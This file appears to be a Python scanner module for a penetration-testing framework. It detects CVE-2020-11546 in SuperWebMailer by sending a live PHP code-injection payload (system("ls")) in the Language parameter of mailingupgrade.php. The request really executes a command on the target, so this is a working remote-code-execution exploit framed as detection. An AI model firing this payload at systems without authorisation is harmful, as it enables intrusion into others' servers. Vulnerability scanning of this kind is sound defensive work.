#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SuperWebMailer 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SuperWebmailer 7.21.0.01526 - Remote Code Execution Detection',
        'description': 'SuperWebMailer 7.21.0.01526 is susceptible to a remote code execution vulnerability in the Language parameter of mailingupgrade.php. An unauthenticated remote attacker can exploit this behavior to execute arbitrary PHP code via Code Injection.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rce', 'superwebmailer', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Official-BlackHat13/CVE-2020-11546/',
            'https://blog.to.com/advisory-superwebmailer-cve-2020-11546/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-11546',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/HimmelAward/Goby_POC',
        ],
        'cve': 'CVE-2020-11546',
    }

    def run(self):
        path = '/mailingupgrade.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='step=1&Language=de{${system("ls")}}&NextBtn=Weiter+%3E\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('ajax_ccea.php', 'ajax_getemailingactions.php', 'ajax_getemailtemplates.php',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='SuperWebmailer 7.21.0.01526 - Remote Code Execution detected', path=path)
            return True
        return False

